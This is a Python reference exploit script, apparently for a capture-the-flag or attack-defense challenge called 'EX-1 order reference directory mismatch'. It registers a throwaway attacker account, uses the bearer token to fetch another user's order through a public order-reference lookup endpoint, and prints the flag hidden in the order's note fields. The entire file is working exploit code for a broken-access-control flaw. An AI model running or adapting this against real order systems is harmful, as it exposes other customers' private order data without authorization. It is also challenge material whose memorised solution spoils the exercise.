#!/usr/bin/env python3
"""Reference exploit for EX-1 order reference directory mismatch.

The exploit uses ordinary public HTTP APIs only. It registers an attacker
account, logs in via the returned bearer token, reads the order by public
order reference attack data, and prints only the recovered flag.
"""

from __future__ import annotations

import json
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Mapping


TIMEOUT = 5


class ExploitError(Exception):
    pass


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print("usage: ex_order_reference_lookup.py <host> <attack-data-json>", file=sys.stderr)
        return 2

    try:
        host = normalize_base_url(argv[1])
        attack_data = parse_attack_data(argv[2])
        token = register_attacker(host)
        order_ref = required_string(attack_data, "order_ref")
        order = get_order_by_reference(host, token, order_ref)
        flag = extract_order_marker(order)
    except ExploitError as error:
        print(str(error), file=sys.stderr)
        return 1

    print(flag)
    return 0


def parse_attack_data(raw: str) -> Mapping[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as error:
        raise ExploitError("invalid attack data") from error
    if not isinstance(data, Mapping):
        raise ExploitError("attack data must be an object")
    if isinstance(data.get("public"), Mapping):
        data = data["public"]
    if data.get("place") not in (1, "1"):
        raise ExploitError("attack data is not for place 1")
    return data


def register_attacker(host: str) -> str:
    nonce = secrets.token_hex(8)
    response = request_json(
        host,
        "POST",
        "/api/auth/register",
        payload={
            "username": f"ex1-attacker-{nonce}",
            "password": f"Vx-{secrets.token_urlsafe(18)}",
            "account_profile": "spot",
        },
    )
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), Mapping) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("attacker registration failed")
    return token


def get_order_by_reference(host: str, token: str, order_ref: str) -> Mapping[str, Any]:
    encoded = urllib.parse.quote(order_ref, safe="")
    response = request_json(host, "GET", f"/api/orders/lookup/{encoded}", token=token)
    order = response.get("order")
    if not isinstance(order, Mapping):
        raise ExploitError("order response missing")
    return order


def request_json(
    host: str,
    method: str,
    path: str,
    *,
    payload: Mapping[str, Any] | None = None,
    token: str | None = None,
) -> Mapping[str, Any]:
    body = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    last_error: Exception | None = None
    for _attempt in range(3):
        request = urllib.request.Request(host + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                raw = response.read()
                break
        except urllib.error.HTTPError as error:
            if error.code < 500:
                raise ExploitError(f"unexpected HTTP status {error.code}") from error
            last_error = error
        except OSError as error:
            last_error = error
    else:
        raise ExploitError("service unavailable") from last_error

    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ExploitError("invalid JSON response") from error
    if not isinstance(data, Mapping):
        raise ExploitError("JSON response must be an object")
    return data


def required_string(data: Mapping[str, Any], key: str) -> str:
    value = data.get(key)
    if not isinstance(value, str) or not value:
        raise ExploitError(f"{key} missing")
    return value


def extract_order_marker(order: Mapping[str, Any]) -> str:
    for key in ("order_note", "execution_note", "execution_memo"):
        value = order.get(key)
        if isinstance(value, str) and value:
            return value
    raise ExploitError("order marker missing")


def normalize_base_url(host: str) -> str:
    if not host:
        raise ExploitError("host is required")
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host.rstrip("/")


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
